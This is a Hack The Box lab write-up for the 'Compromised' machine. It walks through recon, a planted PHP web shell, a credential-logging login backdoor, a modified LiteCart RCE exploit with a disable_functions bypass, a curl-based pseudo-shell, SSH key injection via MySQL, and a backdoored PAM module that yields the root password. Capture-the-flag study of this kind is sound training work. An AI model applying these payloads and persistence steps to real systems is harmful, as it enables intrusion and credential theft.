---
layout: single
title: Compromised - Hack The Box
excerpt: Compromised is a hard box much more like hackback - it allows you dig into a compromised box and look for how the attacked layed down his persistence techinques to keep his access 
date: 2021-01-23
classes: wide
header:
  teaser: /assets/images/htb-writeup-compromised/compromised_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - linux
---

![](/assets/images/htb-writeup-compromised/compromised_logo.png)`

## Intro

Compromised was rather an interesting box that forced you to look into every corner and specifically thinking like an intruder, looking for any stone turned or changed, and checking if it leads anywhere

## TO-DO list

- Enumerating the hidden web backdoor that logs the admin password on login
- Uploading a shell and bypassing PHP Safe function protection
- Elevating to mysql user 
- Look for root password across the system 



## Initial foothold 

```
nmap -sV -sC -oN nmap/init 10.10.10.207
# Nmap 7.80 scan initiated Thu Nov 19 06:10:46 2020 as: nmap -sV -sC -oN nmap/init 10.10.10.207
Nmap scan report for 10.10.10.207
Host is up (0.095s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:da:5c:8e:8e:fb:8e:75:27:4a:b9:2a:59:cd:4b:cb (RSA)
|   256 d5:c5:b3:0d:c8:b6:69:e4:fb:13:a3:81:4a:15:16:d2 (ECDSA)
|_  256 35:6a:ee:af:dc:f8:5e:67:0d:bb:f3:ab:18:64:47:90 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Legitimate Rubber Ducks | Online Store
|_Requested resource was http://10.10.10.207/shop/en/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Nov 19 06:11:05 2020 -- 1 IP address (1 host up) scanned in 18.87 seconds
```

If we check the site there's a `litecart` with an unknown version. I tried to enumerate it by getting clues from sources and checking a public github repoistery 
but it all yielded nothing, which leaves the option of bruteforce. Sadly bruteforcing is not option because the CSM prevents that and blocks you after 4 attempts.
Interesting there's only one CVE on lite cart and it's an authenticated RCE. So we have to get creds, somehow
let's enumerate files at /
```bash
gobuster dir -w $wordlist_raft_large_dir -t 50 -u http://10.10.10.207/ -o htb/compromised/enum/dirs 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.207/
[+] Threads:        50
[+] Wordlist:       /home/tyr4n7/Documents/SecLists-master//Discovery/Web-Content/raft-large-directories.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/11/19 07:15:41 Starting gobuster
===============================================================
/backup (Status: 301)
gobuster dir -w $wordlist_raft_large_dir -t 50 -u http://10.10.10.207/ -o htb/compromised/enum/dirs 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.207/
[+] Threads:        50
[+] Wordlist:       /home/tyr4n7/Documents/SecLists-master//Discovery/Web-Content/raft-large-directories.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/11/19 07:15:41 Starting gobuster
===============================================================
/backup (Status: 301)
/shop (Status: 301)
```
if we look into backup directory we notice an `a.tar.gz` which when extracted when reveal that there's a hidden file called `.sh.php`
Looking at its source
```php
<?php system($_REQUEST['cmd']); ?>
```
The website has been **compromised** by someone else, and they left us a shell, sadly, if we try to access it the server returns 404 
so I assume the hacker deleted it or the master himself, but hey, he might have backdoored the login. Let's examine the login.php code
```php
<?php
  require_once('../includes/app_header.inc.php');

  document::$template = settings::get('store_template_admin');
  document::$layout = 'login';

  if (!empty($_GET['redirect_url'])) {
    $redirect_url = (basename(parse_url($_REQUEST['redirect_url'], PHP_URL_PATH)) != basename(__FILE__)) ? $_REQUEST['redirect_url'] : document::link(WS_DIR_ADMIN);
  } else {
    $redirect_url = document::link(WS_DIR_ADMIN);
  }

  header('X-Robots-Tag: noindex');
  document::$snippets['head_tags']['noindex'] = '<meta name="robots" content="noindex" />';

  if (!empty(user::$data['id'])) notices::add('notice', language::translate('text_already_logged_in', 'You are already logged in'));

  if (isset($_POST['login'])) {
    //file_put_contents("./.log2301c9430d8593ae.txt", "User: " . $_POST['username'] . " Passwd: " . $_POST['password']);
    user::login($_POST['username'], $_POST['password'], $redirect_url, isset($_POST['remember_me']) ? $_POST['remember_me'] : false);
  }

  if (empty($_POST['username']) && !empty($_SERVER['PHP_AUTH_USER'])) $_POST['username'] = !empty($_SERVER['PHP_AUTH_USER']) ? $_SERVER['PHP_AUTH_USER'] : '';

  $page_login = new view();
  $page_login->snippets = array(
    'action' => $redirect_url,
  );
  echo $page_login->stitch('pages/login');

  require_once vmod::check(FS_DIR_HTTP_ROOT . WS_DIR_INCLUDES . 'app_footer.inc.php');
``` 

in this line:
```php
 //file_put_contents("./.log2301c9430d8593ae.txt", "User: " . $_POST['username'] . " Passwd: " . $_POST['password']);
```
It looks like the hacker backdoored the login to save username/password to the file in `admin/.log2301c9430d8593ae.txt"
and if we go to `http://10.10.10.207/shop/admin/.log2301c9430d8593ae.txt` we get:

```User: admin Passwd: theNextGenSt0r3!~```

that's our way into init foothold. let's grab a shell

```bash
 searchsploit -m php/webapps/45267.py
 chmod 700 45267.py

 python 45267.py -h
usage: 45267.py [-h] [-t T] [-p P] [-u U]

LiteCart

optional arguments:
  -h, --help  show this help message and exit
  -t T        admin login page url - EX: https://IPADDRESS/admin/
  -p P        admin password
  -u U        admin username

 python 45267.py -u admin -p 'theNextGenSt0r3!~' -t http://10.10.10.207/shop/admin/
 Shell => http://10.10.10.207/shop/admin/../vqmod/xml/XI7S6.php?c=id

but the shell isn't working.
however if we modify the exploit to open a file and put the file contents in the uploaded file, like this:
```python
rvshell = open('rv.php','r')
content = rvshell.read()

files = {
        'vqmod': (rand + '.php', content, "application/xml"),
        'token':one,
        'upload':(None,"Upload")
    }
```
where `rv.php` will have our contents. So let's enumerate why our shell isn't working by checking `phpinfo()`. i'll just simply put `<?php echo phpinfo()?>` inside the rv.php and run the exploit
and we get a regular phpinfo page but we notice that there are many php disabled functions, and that includes:
```php
system,passthru,popen,shell_exec,proc_open,exec,fsockopen,socket_create,curl_exec,curl_multi_exec,mail,putenv,imap_open,parse_ini_file,show_source,file_put_contents,fwrite,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals
```
luckly the phpversion is `7.2` which has a bypass to disabled functions from `https://www.exploit-db.com/exploits/47462`. i'll simply download it and copy its contents to my `rv.php`
and change this line from:
```php
pwn('uname -a');
```

to

```php
pwn($_REQUEST[c]);
```
and if we upload now we get code execution as `www-data`.
let's do a small modification to get a pesudo-shell
```bash
#!/bin/bash

cmd=''
while [[ $cmd != 'exit' ]];
do
        read -p '$ > ' cmd
        curl -G http://10.10.10.207/shop/vqmod/xml/ZKI5D.php --data-urlencode "c=$cmd"
done
```
replace ```http://10.10.10.207/shop/vqmod/xml/RAND.php``` with your shell and you'll get a nice psuedo shell

## Pivoting to user

if we check `/etc/passwd`

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
sysadmin:x:1000:1000:compromise:/home/sysadmin:/bin/bash
mysql:x:111:113:MySQL Server,,,:/var/lib/mysql:/bin/bash
red:x:1001:1001::/home/red:/bin/false
```

we notice that mysql is defaulting to bash shell. That's not normal, perhaps the attackers did that to get persistence as mysql. We can get a user on mysql if we copy our public key to `/var/lib/mysql/.ssh/authorized_hosts`

```bash
 mysql -u root -pchangethis -e "select exec_cmd('echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC1D14FX2YhBRt8wFs63JxZnHhuYFOaFxc+gjujfV936h9IYVmBpqAAWfzC9nEy2hZ1r6lhXRvVZENKVUR7IgKcokXVoZyUkqUPnl5TXg6qCJfqzbCEMoljl0Ro2f4vL7wJrBG07OlidIppWhpQ6M3tOv5X1UsS9vNE8Kwet5+fmp7pFdUBOe1ncJvQBuOHAgKxPuNmPllUbkzhU1svrIlN9wYiaFD0UykW+8IOHvNDaSIQ9s9p5rngDDh45z52R/pJv619lbmgw7C1mhr6Vsa5t695B4tvXR2xrWQGe9Q7E9owif2rIpY9ruWq9lNbOeH7ZJDx/mu5u0EtNNilvJt7FNHfYznIvsJu3pGBsKkLXvp0G0roSPzbEMTG6BuaLmIlrzJlox0VUNIy4M/2qpep+xR3SRKFrDvyqc559tMzlJBUUgjNZqI/Ht0Wu6PzY7C6RcklO6H1akTdY5SBcZA6seoib0hvnkfRgVYUKzKVdK1cZUl1Evr4nPApqx82WJM= tyr4n7@void > /var/lib/mysql/.ssh/authorized_keys');"
```

then connect as mysql 

```
ssh mysql@10.10.10.207
```
which lands us a ssh shell as mysql-user, sadly if you look around there's not any user.txt. I'll skip it for now and look for the hacker backdoor


## Priv esc / Root

by finding newly modified files we get: 
`find / -newermt "2020-07-14" ! -newermt "2020-09-14" -type f 2>/dev/null`
as well as verifying integrity of all files using `dpkg -V 2>/dev/null`

```
??5??????   /boot/System.map-4.15.0-99-generic
??5?????? c /etc/apache2/apache2.conf
??5?????? c /etc/apache2/sites-available/000-default.conf
??5??????   /boot/vmlinuz-4.15.0-101-generic
??5?????? c /etc/sudoers
??5?????? c /etc/sudoers.d/README
??5?????? c /etc/at.deny
??5?????? c /etc/iscsi/iscsid.conf
??5??????   /boot/vmlinuz-4.15.0-99-generic
??5??????   /bin/nc.openbsd
??5??????   /boot/System.map-4.15.0-101-generic
??5??????   /var/lib/polkit-1/localauthority/10-vendor.d/systemd-networkd.pkla
??5??????   /lib/x86_64-linux-gnu/security/pam_unix.so
??5?????? c /etc/apparmor.d/usr.sbin.mysqld
??5?????? c /etc/mysql/mysql.conf.d/mysqld.cnf
```
we realise that pam_unix.so is changed. Opening it up in IDA and looking up in the hex view brings us these suspicious lines in 31xx:

```
text:0000000000003190 loc_3190:                               ; CODE XREF: pam_sm_authenticate+152↑j
.text:0000000000003190                 mov     r15, [rsp+pass]
.text:0000000000003195                 mov     rax, 'E3U~eklz'
.text:000000000000319F                 lea     rsi, [rsp+s2]   ; s2
.text:00000000000031A4                 mov     qword ptr [rsp+s2], rax
.text:00000000000031A9                 mov     rax, '-2m28vn'
```
and if we do some logic in python:
```python
>>> a = 'E3U~eklz'
>>> b = '-2m28vn'
>>> ab = a[::-1] +b[::-1]
>>> ab
'zlke~U3Env82m2-'
>>> 
```
we get: zlke~U3Env82m2-

if we try to `su root` with that password and we get a rootshell, which sums up the box and ends it here,

Tyr4n7a
